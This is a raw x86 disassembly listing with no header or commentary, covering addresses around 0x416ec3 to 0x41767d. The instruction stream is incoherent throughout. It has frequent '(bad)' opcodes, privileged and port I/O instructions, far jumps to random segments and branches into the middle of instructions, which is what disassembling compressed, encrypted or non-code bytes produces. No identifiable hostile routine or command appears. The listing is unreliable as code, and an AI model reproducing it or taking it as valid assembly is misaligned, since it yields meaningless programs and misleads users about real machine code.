  416ec3:	scas   al,BYTE PTR es:[edi]
  416ec4:	jecxz  0x416ef5
  416ec6:	inc    edx
  416ec7:	(bad)  
  416ec8:	into   
  416ec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416eca:	push   eax
  416ecb:	pop    es
  416ecc:	das    
  416ecd:	pop    edx
  416ece:	lock pushf 
  416ed0:	xchg   ebx,ecx
  416ed2:	sub    ecx,ebx
  416ed4:	mov    ds:0xce82a319,al
  416ed9:	sbb    DWORD PTR [ecx+0xcf3115c],0x12
  416ee0:	jb     0x416f55
  416ee2:	add    eax,0x90363d88
  416ee7:	jmp    0x416e87
  416ee9:	out    0x5d,eax
  416eeb:	(bad)  
  416eec:	dec    ebx
  416eed:	pop    ds
  416eee:	repz loopne 0x416ebb
  416ef1:	inc    esp
  416ef2:	xchg   esp,eax
  416ef3:	inc    ecx
  416ef4:	xor    dl,BYTE PTR [ebp+0x67c5f9f0]
  416efa:	mov    esp,0xdc480496
  416eff:	xchg   edx,eax
  416f00:	adc    edx,DWORD PTR [ecx+0x5e]
  416f03:	aam    0xa0
  416f05:	ja     0x416f22
  416f07:	mov    ds:0x6c52ddee,al
  416f0c:	mov    ebp,0xc3a8f676
  416f11:	(bad)  
  416f12:	jmp    0x416eeb
  416f14:	and    BYTE PTR [edx-0x6f],0x57
  416f18:	test   BYTE PTR [eax+0x47],ah
  416f1b:	or     ebp,DWORD PTR [esi+0x2a30aa8b]
  416f21:	sub    esp,DWORD PTR [ebp+0x2d]
  416f24:	cmp    al,0xb5
  416f26:	(bad)  
  416f27:	adc    DWORD PTR [edi-0x7bc57569],edx
  416f2d:	add    al,0x78
  416f2f:	sahf   
  416f30:	push   es
  416f31:	mov    ch,0x61
  416f33:	sub    DWORD PTR [edx+ecx*1],edi
  416f36:	pop    esi
  416f37:	and    eax,0x18c0c176
  416f3c:	(bad)  
  416f3d:	jmp    0xecf8:0x263316db
  416f44:	mov    ch,0xfa
  416f46:	xchg   edx,eax
  416f47:	mov    ebp,0x8332404d
  416f4c:	jmp    0x416f4a
  416f4e:	pop    ebp
  416f4f:	nop
  416f50:	cli    
  416f51:	and    al,0xad
  416f53:	pop    ebp
  416f54:	call   FWORD PTR [ecx]
  416f56:	xchg   edx,eax
  416f57:	adc    al,0x8f
  416f59:	inc    ecx
  416f5a:	test   BYTE PTR [edx],dh
  416f5c:	push   0x70
  416f5e:	fist   WORD PTR [ebx]
  416f60:	push   esi
  416f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f62:	(bad)  
  416f63:	cwde   
  416f64:	sbb    DWORD PTR [edi+0x423541d2],0xca092c1e
  416f6e:	adc    BYTE PTR [esi],al
  416f70:	hlt    
  416f71:	and    al,0xb1
  416f73:	mov    eax,0x63233467
  416f78:	xchg   ecx,eax
  416f79:	pusha  
  416f7a:	ficomp WORD PTR [ebp+edx*2-0x270cdd56]
  416f81:	test   ah,bh
  416f83:	pop    ds
  416f84:	cmc    
  416f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f86:	icebp  
  416f87:	cdq    
  416f88:	mov    ebp,0x774acf7
  416f8d:	sub    eax,DWORD PTR [edi]
  416f8f:	add    al,0x49
  416f91:	xor    eax,0xed37edf7
  416f96:	sbb    BYTE PTR [edx-0x53],al
  416f99:	fs arpl ax,cx
  416f9c:	mov    edx,0x71a16c9f
  416fa1:	pop    es
  416fa2:	jge    0x416f5b
  416fa4:	popf   
  416fa5:	dec    ebp
  416fa6:	mov    esp,0x718238b6
  416fab:	sub    al,0xcb
  416fad:	mov    BYTE PTR [ebx+ecx*8+0x53],al
  416fb1:	shr    BYTE PTR [esi+0x44],0xf5
  416fb5:	sub    al,0x63
  416fb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fb8:	mov    ds:0xbe3011db,al
  416fbd:	test   DWORD PTR [edi],ebp
  416fbf:	jmp    0x416f53
  416fc1:	dec    ecx
  416fc2:	add    dh,ch
  416fc4:	mov    DWORD PTR [ecx],edi
  416fc6:	js     0x417028
  416fc8:	out    0x30,al
  416fca:	or     bl,al
  416fcc:	dec    ebx
  416fcd:	fxam   
  416fcf:	inc    esp
  416fd0:	fnstsw ax
  416fd2:	mov    ah,0x6f
  416fd4:	div    BYTE PTR [ecx+0x1cb14bd]
  416fda:	mov    dh,0x60
  416fdc:	sub    al,0xf
  416fde:	jg     0x41702f
  416fe0:	mov    ebp,0x73ab0c9d
  416fe5:	inc    esp
  416fe6:	mov    eax,0x957aab6c
  416feb:	jb     0x416f93
  416fed:	adc    esi,edi
  416fef:	mov    eax,DWORD PTR [ecx-0x22]
  416ff2:	adc    bh,bl
  416ff4:	je     0x416fe4
  416ff6:	cmp    al,0xc2
  416ff8:	nop
  416ff9:	or     eax,0xe6bb2234
  416ffe:	ret    
  416fff:	cld    
  417000:	aam    0x5b
  417002:	adc    bh,ch
  417004:	mov    ah,0xaf
  417006:	lods   al,BYTE PTR ds:[esi]
  417007:	cmp    cl,dl
  417009:	jmp    0xeb2a:0xe4ae8c1c
  417010:	jp     0x416f99
  417012:	sub    BYTE PTR [edx+0x7c458cc8],ch
  417018:	xor    esp,edx
  41701a:	and    al,0xa0
  41701c:	xchg   edx,eax
  41701d:	or     BYTE PTR [esi-0x1ea13d53],dl
  417023:	add    cl,BYTE PTR [edi]
  417025:	les    edx,FWORD PTR [ebx+edx*1-0x57]
  417029:	gs inc ebp
  41702b:	inc    esp
  41702c:	cmp    bl,BYTE PTR [ecx+edi*4-0x10a6de2]
  417033:	xor    dl,BYTE PTR fs:[ebx-0xd]
  417037:	outs   dx,BYTE PTR ds:[esi]
  417038:	mov    bl,BYTE PTR [esi-0x1f]
  41703b:	dec    edi
  41703c:	and    al,0x5b
  41703e:	js     0x416ff8
  417040:	into   
  417041:	pusha  
  417042:	cmc    
  417043:	xchg   edx,eax
  417044:	ja     0x416fd8
  417046:	(bad)  
  417047:	mov    ds:0xddb67e9e,al
  41704c:	test   eax,0x28025c13
  417051:	xchg   esp,eax
  417052:	dec    ecx
  417053:	fist   WORD PTR [edx+ecx*4]
  417056:	add    BYTE PTR [ecx+edi*1+0x7cc896dc],0xab
  41705e:	adc    dl,BYTE PTR [ebx+0x30]
  417061:	inc    ecx
  417062:	fwait
  417063:	push   esi
  417064:	test   al,dl
  417066:	and    BYTE PTR [edi],bh
  417068:	sbb    DWORD PTR [esi],0xffffffa6
  41706b:	xor    ebx,DWORD PTR [ebp+ecx*8-0x19]
  41706f:	sbb    al,0x5f
  417071:	pop    es
  417072:	fs dec edx
  417074:	xchg   ebp,eax
  417075:	test   al,0xfb
  417077:	fwait
  417078:	call   0x61ef2097
  41707d:	loop   0x4170ad
  41707f:	ja     0x417089
  417081:	(bad)  
  417082:	ficom  DWORD PTR [esi-0x465af1f0]
  417088:	dec    esp
  417089:	in     al,dx
  41708a:	je     0x417047
  41708c:	lods   eax,DWORD PTR ds:[esi]
  41708d:	(bad)  
  41708e:	imul   BYTE PTR [edx]
  417090:	fcmovnb st,st(6)
  417092:	test   DWORD PTR ds:0xa8800ef3,0x5577e069
  41709c:	jmp    0xa0272bf8
  4170a1:	in     al,dx
  4170a2:	mov    edx,0x106075b7
  4170a7:	xchg   edi,eax
  4170a8:	das    
  4170a9:	(bad)  
  4170aa:	adc    al,0x91
  4170ac:	ror    al,cl
  4170ae:	cmp    al,0x41
  4170b0:	mov    ch,bh
  4170b2:	pop    eax
  4170b3:	aas    
  4170b4:	std    
  4170b5:	pop    ss
  4170b6:	cmp    ebp,edi
  4170b8:	inc    ecx
  4170b9:	mov    ebp,0x6b9ba806
  4170be:	xor    al,0xe0
  4170c0:	mov    ebp,0x6ffae7bd
  4170c5:	rcl    ah,1
  4170c7:	in     eax,dx
  4170c8:	popf   
  4170c9:	lods   al,BYTE PTR ds:[esi]
  4170ca:	popf   
  4170cb:	add    eax,0xa86938d9
  4170d0:	bnd ret 
  4170d2:	mov    ah,0xeb
  4170d4:	imul   esp,DWORD PTR [esi],0xd3eea949
  4170da:	or     DWORD PTR [ebp+0x6c0e97b0],ecx
  4170e0:	add    eax,edx
  4170e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170e3:	(bad)  [ebp+0x26]
  4170e6:	mov    ch,0xc3
  4170e8:	jns    0x4170f0
  4170ea:	scas   al,BYTE PTR es:[edi]
  4170eb:	cld    
  4170ec:	test   BYTE PTR [ebx-0x8caed7e],bh
  4170f2:	(bad)  
  4170f4:	add    ch,BYTE PTR [edx]
  4170f6:	push   eax
  4170f7:	out    dx,eax
  4170f8:	inc    edi
  4170f9:	rcl    DWORD PTR [edx],1
  4170fb:	fcom   QWORD PTR [esp+edi*4-0x2a]
  4170ff:	test   BYTE PTR [ecx-0x19],ch
  417102:	loop   0x41710f
  417104:	pop    ss
  417105:	pop    ecx
  417106:	mov    edi,0x6f788fe
  41710b:	inc    ebp
  41710c:	les    ebp,FWORD PTR [ebx-0x73]
  41710f:	int    0x34
  417111:	jbe    0x4170b5
  417113:	test   eax,ebx
  417115:	lods   al,BYTE PTR ds:[esi]
  417116:	test   DWORD PTR [ebp-0x6c],edi
  417119:	stos   DWORD PTR es:[edi],eax
  41711a:	cld    
  41711b:	sahf   
  41711c:	cmp    DWORD PTR [esi-0xf406d78],eax
  417122:	adc    BYTE PTR [ecx],ah
  417124:	lods   al,BYTE PTR ds:[esi]
  417125:	aad    0x0
  417127:	test   al,dh
  417129:	aaa    
  41712a:	ficomp DWORD PTR [ebx-0x146fdb46]
  417130:	mov    WORD PTR [edi+ebp*1-0x24],cs
  417134:	or     al,0x76
  417136:	and    ecx,DWORD PTR [edx+0x59]
  417139:	push   0xf2525702
  41713e:	sbb    al,0x8
  417140:	jns    0x4171a7
  417142:	mov    dh,0xe6
  417144:	or     edi,DWORD PTR [esp+ebx*1]
  417147:	fisubr WORD PTR [eax]
  417149:	in     al,0x92
  41714b:	out    0x48,al
  41714d:	push   ebp
  41714e:	ja     0x4170e9
  417150:	inc    ebp
  417151:	dec    ebx
  417152:	ins    BYTE PTR es:[edi],dx
  417153:	aad    0x42
  417155:	dec    ebx
  417156:	push   0x78
  417158:	dec    edi
  417159:	dec    ecx
  41715a:	nop
  41715b:	mov    cl,0xd
  41715d:	arpl   WORD PTR [ebp+0x68],sp
  417160:	mov    ebx,esi
  417162:	xchg   ecx,eax
  417163:	cli    
  417164:	in     al,0x9f
  417166:	sbb    DWORD PTR [edx],ecx
  417168:	or     al,BYTE PTR [esi-0x4e717911]
  41716e:	mov    dl,0xb1
  417170:	repnz aaa 
  417172:	dec    eax
  417173:	pusha  
  417174:	sub    bl,BYTE PTR [edx+eiz*4]
  417177:	sub    DWORD PTR [ebp+0x4a76257c],0xd7086570
  417181:	cmp    dh,BYTE PTR [edx+0x18]
  417184:	and    al,0xdd
  417186:	cmp    al,0x29
  417188:	mov    ebp,0x98e4cf45
  41718d:	cmp    esp,DWORD PTR [ebp+0xee469f1]
  417193:	push   ss
  417194:	out    dx,eax
  417195:	loope  0x4171c9
  417197:	mov    eax,ds:0x51cd761c
  41719c:	cmp    ecx,DWORD PTR [ebp-0x79e28752]
  4171a2:	stos   DWORD PTR es:[edi],eax
  4171a3:	lods   al,BYTE PTR ds:[esi]
  4171a4:	jae    0x417182
  4171a6:	xchg   ebp,eax
  4171a7:	mov    dl,0xb3
  4171a9:	sbb    DWORD PTR [edi+edi*8-0xaf47d1a],edi
  4171b0:	jns    0x417192
  4171b2:	outs   dx,DWORD PTR ds:[esi]
  4171b3:	(bad)  
  4171b4:	iret   
  4171b5:	push   ecx
  4171b6:	xor    DWORD PTR [esi-0x11],ebp
  4171b9:	sub    BYTE PTR [esi+0x69],al
  4171bc:	lods   al,BYTE PTR ds:[esi]
  4171bd:	addr16 jns 0x41714b
  4171c0:	add    ebx,DWORD PTR gs:[esp+eax*1]
  4171c4:	inc    edx
  4171c5:	mov    bl,cl
  4171c7:	mov    al,0x9d
  4171c9:	jb     0x4171a1
  4171cb:	mov    bh,0xe2
  4171cd:	add    BYTE PTR [ebx],0x9
  4171d0:	fcom   DWORD PTR [ecx+esi*8+0x2c4aa111]
  4171d7:	ret    
  4171d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171d9:	ss push ebx
  4171db:	shr    cl,0xa
  4171de:	pop    edi
  4171df:	mov    ?,WORD PTR [edi]
  4171e1:	jae    0x417237
  4171e3:	pop    eax
  4171e4:	in     al,0x6f
  4171e6:	pop    esi
  4171e7:	add    ecx,DWORD PTR [edi]
  4171e9:	and    eax,0x8a1021de
  4171ee:	pop    ss
  4171ef:	hlt    
  4171f0:	cmp    eax,0x45d8be7d
  4171f5:	and    DWORD PTR [ebp+0x6],esi
  4171f8:	inc    ebp
  4171f9:	cmp    al,BYTE PTR [edx]
  4171fb:	mov    dh,0x55
  4171fd:	repz leave 
  4171ff:	pop    ds
  417200:	mov    ah,BYTE PTR [ebx+0x34bc8286]
  417206:	call   0x8622bf0f
  41720b:	xchg   esp,eax
  41720c:	and    DWORD PTR [edx-0x366f24e8],esi
  417212:	sub    ebx,DWORD PTR [edx+0x70]
  417215:	inc    ebp
  417216:	scas   al,BYTE PTR es:[edi]
  417217:	out    0x1f,eax
  417219:	jge    0x417272
  41721b:	arpl   WORD PTR fs:[edi],cx
  41721e:	mov    dl,0x62
  417220:	cli    
  417221:	pop    edx
  417222:	loop   0x41722f
  417224:	(bad)  
  417225:	add    DWORD PTR [ebp-0x2367fb0d],ebx
  41722b:	(bad)  [ebx-0x1]
  41722e:	or     esi,DWORD PTR [edi-0x3a615c09]
  417234:	frstor [ecx+0x7ce14cf5]
  41723a:	test   BYTE PTR [ebp-0x9],al
  41723d:	loopne 0x41721e
  41723f:	mov    BYTE PTR [ebx],dh
  417241:	cwde   
  417242:	sbb    DWORD PTR [eax],edi
  417244:	or     cl,ch
  417246:	or     al,bh
  417248:	jge    0x4171e4
  41724a:	fadd   st(7),st
  41724c:	push   ebp
  41724d:	loop   0x4172a2
  41724f:	mov    dh,0x41
  417251:	outs   dx,BYTE PTR ds:[esi]
  417252:	popa   
  417253:	and    eax,0xc02dec6b
  417258:	ret    
  417259:	mov    WORD PTR [ecx-0x5f42f6de],?
  41725f:	ja     0x4172af
  417261:	jp     0x417210
  417263:	call   0x769f:0x826a1cf
  41726a:	jecxz  0x41721c
  41726c:	dec    edx
  41726e:	sub    al,0x52
  417270:	jnp    0x41721f
  417272:	cmp    eax,0x5ca48c1a
  417277:	mov    ebx,0x5a36a88
  41727c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41727d:	sbb    ecx,esp
  41727f:	cmp    ch,0x5e
  417282:	dec    ebx
  417283:	mov    ax,ds:0x913c9c31
  417289:	js     0x41729c
  41728b:	jae    0x4172db
  41728d:	mov    edi,0x93f29bc4
  417292:	cwde   
  417293:	and    DWORD PTR [edx],edi
  417295:	cmp    BYTE PTR [ebx-0x6a16318],bl
  41729b:	xchg   esp,eax
  41729c:	retf   
  41729d:	das    
  41729e:	lods   al,BYTE PTR ds:[esi]
  41729f:	xor    eax,0x82b68ef9
  4172a4:	shr    BYTE PTR [ecx+0x4beb9c8e],cl
  4172aa:	sahf   
  4172ab:	mov    ds:0xfa4f71f8,eax
  4172b0:	in     eax,0xb1
  4172b2:	lods   eax,DWORD PTR ds:[esi]
  4172b3:	(bad)  
  4172b4:	es adc al,0xe6
  4172b7:	add    al,0x86
  4172b9:	sub    bl,bh
  4172bb:	mov    BYTE PTR [ebx+0x6be64c27],dh
  4172c1:	ret    0x3ef9
  4172c4:	xchg   edi,eax
  4172c5:	xchg   esp,eax
  4172c6:	rol    BYTE PTR [edi+eax*8],cl
  4172c9:	xor    BYTE PTR [esi+ebp*2+0x41],bl
  4172cd:	xor    edi,DWORD PTR [edx-0x50]
  4172d0:	retf   0xece6
  4172d3:	xor    bh,cl
  4172d5:	js     0x41733b
  4172d7:	add    ah,cl
  4172d9:	push   DWORD PTR [edx-0xc]
  4172dc:	cmp    ecx,ebp
  4172de:	enter  0x9bb9,0xf7
  4172e2:	jl     0x417309
  4172e4:	sub    DWORD PTR [edx+eiz*4],edi
  4172e7:	shl    ebp,cl
  4172e9:	mov    dh,0x6a
  4172eb:	loop   0x41727a
  4172ed:	push   ecx
  4172ee:	and    al,0x60
  4172f0:	neg    DWORD PTR [esi-0x5cc08f91]
  4172f6:	(bad)  
  4172f8:	imul   esp,DWORD PTR [ebp+0xc],0x20
  4172fc:	mov    ecx,0x6e77796a
  417301:	sbb    ah,BYTE PTR [esi-0x4b]
  417304:	jb     0x4172ca
  417306:	pop    esp
  417307:	pushf  
  417308:	mov    ch,0x1d
  41730a:	lods   eax,DWORD PTR ds:[esi]
  41730b:	fwait
  41730c:	xor    edx,DWORD PTR [esi+eiz*2-0x5e]
  417310:	jns    0x4172c1
  417312:	cmp    eax,0x3a96b5a5
  417317:	repnz pop eax
  417319:	jo     0x41733d
  41731b:	pop    ebx
  41731c:	xlat   BYTE PTR ds:[ebx]
  41731d:	rcl    DWORD PTR [eax-0xc],1
  417320:	jno    0x41733e
  417322:	fdivr  QWORD PTR [eax-0x4dd51fe0]
  417328:	loopne 0x417337
  41732a:	pop    ds
  41732b:	ss jo  0x417306
  41732e:	mov    ebp,0x7dcb919a
  417333:	xchg   ebx,eax
  417334:	mov    bh,0xae
  417336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417337:	and    DWORD PTR cs:[ebp-0x2d],edi
  41733b:	retf   0xc3fd
  41733e:	sub    al,0x27
  417340:	lahf   
  417341:	mov    eax,ds:0xfda525ba
  417346:	(bad)  
  417347:	sbb    DWORD PTR [edx-0x11],edx
  41734a:	retf   0x1184
  41734d:	scas   eax,DWORD PTR es:[edi]
  41734e:	jns    0x4173b2
  417350:	cmp    bh,BYTE PTR [ecx+0x17e43641]
  417356:	inc    ebx
  417357:	mov    ds:0x63047be8,eax
  41735c:	push   ss
  41735d:	call   0xea94f9fd
  417362:	add    DWORD PTR [edx],edx
  417364:	jmp    0x417350
  417366:	in     al,0x98
  417368:	pop    DWORD PTR [esi+0x23]
  41736b:	es hlt 
  41736d:	add    cl,BYTE PTR [eax]
  41736f:	mov    ds:0x70b171fa,eax
  417374:	aas    
  417375:	mov    dl,0x76
  417377:	inc    edx
  417378:	je     0x4173f9
  41737a:	dec    esp
  41737b:	fwait
  41737c:	pop    edi
  41737d:	jmp    0x417318
  41737f:	je     0x4173b9
  417381:	rcl    BYTE PTR [ebp+0x2eaacf57],0xe
  417388:	fldenv cs:[esp+ebx*8+0x735aae8a]
  417390:	inc    ebp
  417391:	xor    esp,DWORD PTR [ebx]
  417393:	dec    edi
  417394:	or     al,0x27
  417396:	add    cl,cl
  417398:	gs jmp 0x60906b51
  41739e:	fstp   QWORD PTR [esi+0x4c14593e]
  4173a4:	adc    edi,ebp
  4173a6:	into   
  4173a7:	push   edx
  4173a8:	test   al,0xab
  4173aa:	outs   dx,BYTE PTR ds:[esi]
  4173ab:	xchg   ebp,eax
  4173ac:	jge    0x4173ed
  4173ae:	faddp  st(4),st
  4173b0:	jmp    0x8728:0x462fa02d
  4173b7:	daa    
  4173b8:	loop   0x4173c6
  4173ba:	xor    eax,0x4266fc39
  4173bf:	les    esi,FWORD PTR [ebp-0x12c187aa]
  4173c5:	and    dl,al
  4173c7:	dec    esp
  4173c8:	xlat   BYTE PTR ds:[ebx]
  4173c9:	mov    ch,0x40
  4173cb:	addr16 pop ebp
  4173cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173ce:	xchg   ebx,eax
  4173cf:	jmp    0x417394
  4173d1:	push   ebp
  4173d2:	mov    ebp,0x76dd6664
  4173d7:	stos   BYTE PTR es:[edi],al
  4173d8:	jg     0x4173c5
  4173da:	push   cs
  4173db:	fwait
  4173dc:	(bad)  
  4173dd:	scas   al,BYTE PTR es:[edi]
  4173de:	add    DWORD PTR [ebx],ebp
  4173e0:	popf   
  4173e1:	push   0x34d1383b
  4173e6:	les    eax,FWORD PTR [bx+si-0x6a]
  4173ea:	or     BYTE PTR [ecx+0x6e],0xcd
  4173ee:	sbb    BYTE PTR [ebp-0xd],dl
  4173f1:	inc    edx
  4173f2:	or     al,0xbc
  4173f4:	and    ebx,esi
  4173f6:	mov    WORD PTR [esi-0x4168674a],gs
  4173fc:	mov    ebp,0x5b510284
  417401:	dec    esp
  417402:	cwde   
  417403:	xchg   ecx,eax
  417404:	outs   dx,DWORD PTR ds:[esi]
  417405:	adc    ecx,DWORD PTR [ebp-0xed2a192]
  41740b:	sbb    eax,0x343da85c
  417411:	xchg   esp,eax
  417412:	inc    ebp
  417413:	push   edi
  417414:	outs   dx,DWORD PTR ds:[esi]
  417415:	idiv   DWORD PTR [ebp+0x29]
  417418:	ins    BYTE PTR es:[edi],dx
  417419:	xchg   esp,eax
  41741a:	pop    ebx
  41741b:	sub    bl,al
  41741d:	jp     0x417421
  41741f:	or     eax,0xf0c6056e
  417424:	push   esp
  417425:	push   0x9
  417427:	pushf  
  417428:	cld    
  417429:	iret   
  41742a:	inc    ebp
  41742b:	inc    esi
  41742c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41742d:	xor    DWORD PTR [edi+0x52248979],edi
  417433:	ins    DWORD PTR es:[edi],dx
  417434:	test   DWORD PTR [ebx-0x154dc78],0xf876afba
  41743e:	push   esp
  41743f:	xor    BYTE PTR [ebx+edi*2-0x70],al
  417443:	mov    esi,DWORD PTR [esi]
  417445:	stos   DWORD PTR es:[edi],eax
  417446:	pop    edi
  417447:	mov    al,0x8c
  417449:	xor    DWORD PTR [eax-0xa],0x922bb67b
  417450:	out    0x78,al
  417452:	jo     0x41742e
  417454:	sub    cl,BYTE PTR [ecx-0x4b]
  417457:	push   esi
  417458:	daa    
  417459:	xchg   ecx,eax
  41745a:	mov    edi,0x2e5e83d3
  41745f:	cmp    DWORD PTR [edx-0x183b956b],ebx
  417465:	fcmovb st,st(7)
  417467:	stos   BYTE PTR es:[edi],al
  417468:	mov    esp,0xce7aaa7e
  41746d:	iret   
  41746e:	pop    ebp
  41746f:	sub    edx,ebx
  417471:	pop    edi
  417472:	sahf   
  417473:	dec    ebp
  417474:	test   eax,0x51ef6c5c
  417479:	sbb    BYTE PTR [ebx-0xf905b5f],dh
  41747f:	int    0xde
  417481:	mov    ds:0x1f7be5b5,al
  417486:	jecxz  0x4174f2
  417488:	cdq    
  417489:	addr16 push ss
  41748b:	(bad)  
  41748c:	xlat   BYTE PTR ds:[ebx]
  41748d:	outs   dx,DWORD PTR ds:[esi]
  41748e:	out    0x42,al
  417490:	fadd   DWORD PTR [edi+esi*4-0x41]
  417494:	test   BYTE PTR [ebx],bh
  417496:	add    BYTE PTR [esp+edi*2+0x316d2c08],0x74
  41749e:	js     0x417471
  4174a0:	or     eax,0x99ca3b4
  4174a5:	dec    ebp
  4174a6:	pop    ds
  4174a7:	int    0x1
  4174a9:	bound  eax,QWORD PTR [eax+0x43]
  4174ac:	bnd call 0xdf9c7cbd
  4174b2:	lods   eax,DWORD PTR ds:[esi]
  4174b3:	sahf   
  4174b4:	and    eax,0xe099860e
  4174b9:	add    al,dh
  4174bb:	push   ss
  4174bc:	push   ss
  4174bd:	shl    BYTE PTR [ecx],1
  4174bf:	clc    
  4174c0:	fwait
  4174c1:	cmp    DWORD PTR ds:0x9f02924d,0x6a58971c
  4174cb:	dec    ebx
  4174cc:	mov    ebx,0x46b86b68
  4174d1:	mov    ds:0x4a570dd8,al
  4174d6:	sub    eax,0x4492c6cf
  4174db:	in     eax,0x96
  4174dd:	dec    edi
  4174de:	cli    
  4174df:	popf   
  4174e0:	mov    al,ds:0x55fe9e00
  4174e5:	(bad)  
  4174e6:	aam    0x8b
  4174e8:	fdivr  st,st(6)
  4174ea:	jl     0x41748a
  4174ec:	retf   0x43d9
  4174ef:	(bad)  
  4174f0:	retf   0xec9d
  4174f3:	xor    dl,BYTE PTR [edi+edi*1-0x59]
  4174f7:	dec    ebx
  4174f8:	add    BYTE PTR [ebp-0x414d0eb7],ch
  4174fe:	jnp    0x41749b
  417500:	push   esi
  417501:	push   ds
  417502:	xor    ch,BYTE PTR [eax]
  417504:	lock jbe 0x4174b7
  417507:	push   0xbb7065a4
  41750c:	or     dh,ah
  41750e:	(bad)  
  41750f:	or     BYTE PTR [eax-0x17b9ca33],bl
  417515:	pop    esp
  417516:	jmp    0xc25b:0xe75e48ed
  41751d:	(bad)  
  41751e:	xor    BYTE PTR [edi],bl
  417520:	inc    ebp
  417521:	test   al,0xc1
  417523:	js     0x417505
  417525:	adc    al,ah
  417527:	dec    esi
  417528:	inc    ebx
  417529:	hlt    
  41752a:	ret    0x72e0
  41752d:	int3   
  41752e:	inc    eax
  41752f:	or     DWORD PTR ds:0xabf24380,ebx
  417535:	lds    esp,FWORD PTR [ebx-0x66c5c1df]
  41753b:	cmc    
  41753c:	sub    al,BYTE PTR ds:0x57fbbd04
  417542:	mov    DWORD PTR [edx+0x26834824],esp
  417548:	out    0x65,eax
  41754a:	mov    ecx,0x8a259a7c
  41754f:	mov    cs,esp
  417551:	retf   
  417552:	shl    DWORD PTR [esi+0x2db02288],0xe3
  417559:	mov    bl,0x2
  41755b:	mov    ch,0x41
  41755d:	dec    ebx
  41755e:	jne    0x417571
  417560:	int3   
  417561:	stc    
  417562:	xchg   edi,eax
  417563:	jb     0x4175d4
  417565:	jmp    0xe3ca:0x75940552
  41756c:	leave  
  41756d:	xchg   BYTE PTR [ebp-0x6afa65aa],ah
  417573:	cmp    ebp,edx
  417575:	jl     0x4175ab
  417577:	leave  
  417578:	gs (bad) 
  41757a:	mov    dl,0x3e
  41757c:	push   es
  41757d:	std    
  41757e:	cli    
  41757f:	and    esi,DWORD PTR [edi+0x429e050d]
  417585:	sahf   
  417586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417587:	out    0xf8,al
  417589:	jg     0x41758d
  41758b:	and    ch,BYTE PTR [edx-0x64]
  41758e:	or     eax,0x4d2b6cde
  417593:	sahf   
  417594:	loope  0x417579
  417596:	lods   eax,DWORD PTR ds:[esi]
  417597:	arpl   WORD PTR [esp+edi*2+0x2f82f872],di
  41759e:	fadd   DWORD PTR [esi-0x288dbc94]
  4175a4:	lods   eax,DWORD PTR ds:[esi]
  4175a5:	jg     0x4175b3
  4175a7:	sbb    al,dl
  4175a9:	test   eax,0xb5a71565
  4175ae:	adc    DWORD PTR [eax+0x25089fd1],ebp
  4175b4:	inc    ebp
  4175b5:	in     al,dx
  4175b6:	inc    ebx
  4175b7:	jo     0x4175e2
  4175b9:	retf   
  4175ba:	jmp    0x8500:0x72391d4e
  4175c1:	fild   WORD PTR [ebx+esi*8+0x14]
  4175c5:	hlt    
  4175c6:	adc    dh,BYTE PTR [esi-0x2f561c6d]
  4175cc:	hlt    
  4175cd:	into   
  4175ce:	adc    al,0xd4
  4175d0:	outs   dx,DWORD PTR ds:[esi]
  4175d1:	pop    ss
  4175d2:	dec    edi
  4175d3:	retf   
  4175d4:	xchg   BYTE PTR [esp+edx*1+0x2c],al
  4175d8:	leave  
  4175d9:	mov    WORD PTR [ecx+0x77],cs
  4175dc:	sbb    eax,0x4a0460d3
  4175e1:	call   0xa348dedd
  4175e6:	pop    esi
  4175e7:	mov    al,BYTE PTR [ecx]
  4175e9:	test   eax,0x8b86bdd8
  4175ee:	mov    eax,ds:0x4ce53dba
  4175f3:	fwait
  4175f4:	and    eax,DWORD PTR [ecx]
  4175f6:	sbb    ah,BYTE PTR [edi+0x23]
  4175f9:	inc    ebp
  4175fa:	scas   eax,DWORD PTR es:[edi]
  4175fb:	or     DWORD PTR [esi+eax*8],edi
  4175fe:	int3   
  4175ff:	pop    eax
  417600:	or     BYTE PTR ds:0x38cc89c7,ah
  417606:	jmp    0xf865e60a
  41760b:	mov    esi,0xb2b950cb
  417610:	mov    DWORD PTR [esi+0x6e],esp
  417613:	push   eax
  417614:	sti    
  417615:	int    0x7a
  417617:	nop
  417618:	ja     0x417604
  41761a:	push   ecx
  41761b:	aad    0x9f
  41761d:	inc    ebx
  41761e:	leave  
  41761f:	ret    
  417620:	or     edi,DWORD PTR [eax]
  417622:	fcmovne st,st(5)
  417624:	shl    DWORD PTR [ebx],1
  417626:	mov    esi,0xf566946c
  41762b:	in     al,0x56
  41762d:	loope  0x41767d
  41762f:	mov    eax,0x302033eb
  417634:	jo     0x4175c3
  417636:	fisubr WORD PTR ds:0x7efe3885
  41763c:	xor    cl,BYTE PTR [edx-0x3a]
  41763f:	loopne 0x4175c6
  417641:	mov    ah,0x99
  417643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417644:	je     0x417607
  417646:	pop    ss
  417647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417648:	jbe    0x4175f6
  41764a:	fmul   st,st(6)
  41764c:	dec    ebp
  41764d:	scas   al,BYTE PTR es:[edi]
  41764e:	xor    DWORD PTR [esi+0x3b94ffb],esp
  417654:	in     eax,0x46
  417656:	ja     0x417604
  417658:	mov    al,ds:0xed22347c
  41765d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41765e:	push   edx
  41765f:	jae    0x4176d3
  417661:	sub    al,BYTE PTR ds:0x6f9d4bff
  417667:	outs   dx,DWORD PTR ds:[esi]
  417668:	call   0xaf29febd
  41766d:	sub    bl,dh
  41766f:	loopne 0x4175fc
  417671:	sahf   
  417672:	ins    DWORD PTR es:[edi],dx
  417673:	cdq    
  417674:	rcl    BYTE PTR [edx],1
  417676:	fcmovnbe st,st(1)
  417678:	rol    DWORD PTR [edi],0xfa
  41767b:	fcmovb st,st(3)
  41767d:	sub    ebp,ebx
